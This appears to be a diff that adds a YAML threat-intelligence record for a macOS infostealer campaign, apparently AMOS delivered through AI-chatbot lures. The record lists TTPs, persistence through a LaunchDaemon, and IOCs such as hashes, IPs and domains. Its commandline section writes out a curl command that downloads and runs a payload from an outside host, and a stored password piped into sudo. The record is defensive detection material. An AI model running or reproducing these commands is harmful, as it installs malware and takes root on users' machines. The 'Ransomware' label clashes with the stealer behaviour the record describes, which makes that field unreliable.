@@ -1,0 +1,57 @@
+description: '''Report contains technical details of a ransomware attack including
+  obfuscated scripts and persistence mechanisms.'''
+malware_families: '[''Ransomware'']'
+TTPs:
+  processes:
+  - bash
+  - osascript
+  - sudo
+  commandline:
+  - cat /tmp/.pass | sudo -S <privileged_command>
+  - curl hxxps://putuartana.com/cleangpt -o /tmp/update && chmod +x /tmp/update &&
+    /tmp/update
+  powershell: []
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - update -> hxxps://putuartana.com/cleangpt
+  - com.finder.helper.plist -> hxxps://wbehub.org
+  - Ledger Wallet.app -> hxxps://sanchang.org
+  file_activity:
+  - /tmp/.pass
+  - /tmp/update
+  - /Users/$USER/.helper
+  - /Applications/Ledger Wallet.app
+  - /Library/LaunchDaemons/com.finder.helper.plist
+  - /tmp/out.zip
+  persistence:
+  - LaunchDaemon com.finder.helper.plist relaunches .agent under user context
+  process_relations: []
+IOCs:
+  hashes:
+  - 276db4f1dd88e514f18649c5472559aed0b2599aa1f1d3f26bd9bc51d1c62166
+  - ab60bb9c33ccf3f2f9553447babb902cdd9a85abce743c97ad02cbc1506bf9eb
+  - e1ca6181898b497728a14a5271ce0d5d05629ea4e80bb745c91f1ae648eb5e11
+  - 340c48d5a0c32c9295ca5e60e4af9671c2139a2b488994763abe6449ddfc32aa
+  - 68017DF4A49E315E49B6E0D134B9C30BAE8ECE82CF9DE045D5F56550D5F59FE1
+  ip_addresses:
+  - 45.94.47.205
+  - 45.94.47.186
+  domains:
+  - putuartana.com
+  - wbehub.org
+  - sanchang.org
+  urls:
+  - hxxps://putuartana.com/cleangpt
+  - hxxps://wbehub.org
+  - hxxps://sanchang.org
+authors:
+- Stuart Ashenbrenner
+- Jonathan Semon
+attribution: 'null'
+CVEs: '[]'
+reference: https://www.huntress.com/blog/amos-stealer-chatgpt-grok-ai-trust
+date_of_publication: December 11, 2025
+file_creation_date: December 11, 2025
